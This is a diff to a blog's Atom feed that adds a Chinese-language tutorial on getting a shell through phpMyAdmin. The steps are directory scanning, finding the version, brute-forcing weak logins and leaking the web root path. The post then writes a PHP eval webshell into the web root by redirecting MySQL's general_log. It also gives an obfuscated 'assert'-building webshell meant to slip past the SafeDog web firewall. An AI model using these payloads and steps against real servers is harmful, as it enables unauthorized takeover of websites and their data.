@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2018-11-11T11:03:17.508Z</updated>
+  <updated>2018-11-25T11:14:25.538Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,28 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>getshell技巧-phpMyAdmin的利用</title>
+    <link href="http://yoursite.com/2018/11/26/PHPMyAdmin%E5%88%A9%E7%94%A8/"/>
+    <id>http://yoursite.com/2018/11/26/PHPMyAdmin利用/</id>
+    <published>2018-11-26T13:28:05.000Z</published>
+    <updated>2018-11-25T11:14:25.538Z</updated>
+    
+    <content type="html"><![CDATA[<p>生活就是泥沙俱下，鲜花和荆棘并存。——毕淑敏<br><a id="more"></a></p><h1 id="getshell的思路"><a href="#getshell的思路" class="headerlink" title="getshell的思路"></a>getshell的思路</h1><p>1、明确目标<br>2、信息收集<br>3、漏洞挖掘和利用</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="明确路径"><a href="#明确路径" class="headerlink" title="明确路径"></a>明确路径</h2><p>利用目录扫描工具，对目标网站进行扫描，获取网站目录。常用工具有Kali中的DirBuster、dirb和wwwscan等。<br>我用的是Kali中的DirBuster，对目标进行扫描。<br><img src="/2018/11/26/PHPMyAdmin利用/1.png" alt="目录扫描结果"></p><h2 id="明确版本"><a href="#明确版本" class="headerlink" title="明确版本"></a>明确版本</h2><p>利用内置的文件，（…../phpMyAdmin/README）获取phpMyAdmin的版本信息。<br><img src="/2018/11/26/PHPMyAdmin利用/2.png" alt=""><br>一般网站管理员不会把这个目录删除，所以可以成为我们利用的一个点。</p><h2 id="明确登录口令"><a href="#明确登录口令" class="headerlink" title="明确登录口令"></a>明确登录口令</h2><p>有两种方法，手工和暴力破解。手工就是用一些弱口令进行猜解。<br>暴力破解可以用phpMyAdmin多线程批量破解工具来对phpMyAdmin进行暴力破解。<br><img src="/2018/11/26/PHPMyAdmin利用/3.png" alt="phpMyAdmin多线程批量破解工具"><br>但是工具只是给我们提供参考的，而且工具爆破对phpMyAdmin的版本有一定的要求。</p><h2 id="明确系统类型"><a href="#明确系统类型" class="headerlink" title="明确系统类型"></a>明确系统类型</h2><p>因为系统版本的不同，对权限的控制是不同的。Linux系统对权限的控制相对严格，而window则相对较为疏散的。所以说对window进行getshell相比Linux要容易。</p><h2 id="明确php版本和数据库版本"><a href="#明确php版本和数据库版本" class="headerlink" title="明确php版本和数据库版本"></a>明确php版本和数据库版本</h2><p>可以在phpMyAdmin的管理也可以看到php版本、MySQL版本，系统类型。<br><img src="/2018/11/26/PHPMyAdmin利用/4.png" alt="phpMyAdmin多线程批量破解工具"><br>因为php版本的差异，对渗透的利用是不一样的。</p><h1 id="获取网站真实路径"><a href="#获取网站真实路径" class="headerlink" title="获取网站真实路径"></a>获取网站真实路径</h1><h2 id="phpinfo-函数直接获取"><a href="#phpinfo-函数直接获取" class="headerlink" title="phpinfo()函数直接获取"></a>phpinfo()函数直接获取</h2><p>通过phpinfo.php或者phpinfo()进行获取网站真实路径。<br><img src="/2018/11/26/PHPMyAdmin利用/5.png" alt=""><br>phpinfo.php中会有大量的信息，有php版本、网站路径等。</p><h2 id="构造报错页面获取网站真实路径"><a href="#构造报错页面获取网站真实路径" class="headerlink" title="构造报错页面获取网站真实路径"></a>构造报错页面获取网站真实路径</h2><p>通过构造报错可能会报出网站的真实路径。常见的有页面访问报错、sql注入报错，文件包含报错。<br>phpmyadmin报错常见路径：<br>     /phpMyAdmin/libraries/lect_lang.lib.php<br>     /phpMyAdmin/index.php?lang[]=1<br>     /phpMyAdmin/phpinfo.php<br>     /phpMyAdmin/themes/darkblue_orange/layout.inc.php<br>     /phpMyAdmin/libraries/select_lang.lib.php<br>     /phpMyAdmin/libraries/lect_lang.lib.php<br>     /phpMyAdmin/libraries/mcrypt.lib.php</p><h2 id="借助搜索引擎"><a href="#借助搜索引擎" class="headerlink" title="借助搜索引擎"></a>借助搜索引擎</h2><p>借助搜索引擎，例如：百度、谷歌、fofa、shadon、zoomeye等，搜索关键字“error”,可能会报出网站的真实路径。</p><h1 id="漏洞挖掘和利用"><a href="#漏洞挖掘和利用" class="headerlink" title="漏洞挖掘和利用"></a>漏洞挖掘和利用</h1><h2 id="满足写shell的前提条件"><a href="#满足写shell的前提条件" class="headerlink" title="满足写shell的前提条件"></a>满足写shell的前提条件</h2><p>SHOW VARIABLES LIKE “%secure_file_priv%”;  查看读写文件路径 “secure_file_priv”对应的值不能为null，为null就不能正常写入shell。</p><h2 id="日志写shell"><a href="#日志写shell" class="headerlink" title="日志写shell"></a>日志写shell</h2><p>首先需要检测MySQL全局变量（general_log、general_log_file）的值。<br>general_log是日志保存状态，一共有两个值（ON/OFF）,ON代表开启，OFF代表关闭。<br>general_log_file是日志的保存路径<br>1、开启日志保存<br>      set global general_log=”ON”;<br>      set global general_log_file=”D:/phpStudy/WWW/infos.php”（网站真实路径）<br>2、写shell<br>      select  ‘&lt;?php eval($_POST[yumu)];?&gt;’<br>免杀（绕过安全狗）<br>      $arr = array(‘a’,’s’,’s’,’s’,’e’,’r’,’t’);<br>      $func = “”;<br>      for($i=0;$i&lt;count($arr);$i++){<br>      $func = $func.$arr[$i];<br>      }<br>      $func = substr($func,-6);<br>      $func($_REQUEST[‘c’]);</p><p>#总结<br>在利用phpMyAdmin来getshell时，需要注意对网站信息的收集，特别是网站的PHP版本、网站真实路径。这样才能更好的对网站就行漏洞挖掘。</p><h1 id="推荐文章"><a href="#推荐文章" class="headerlink" title="推荐文章"></a>推荐文章</h1><p><a href="https://xz.aliyun.com/t/2222" target="_blank" rel="noopener">从phpinfo到phpmyadmin的综合渗透利用</a></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;生活就是泥沙俱下，鲜花和荆棘并存。——毕淑敏&lt;br&gt;&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="web安全" scheme="http://yoursite.com/tags/web%E5%AE%89%E5%85%A8/"/>
+    
+      <category term="php" scheme="http://yoursite.com/tags/php/"/>
+    
+  </entry>
   
   <entry>
     <title>新的学习，新的征程</title>
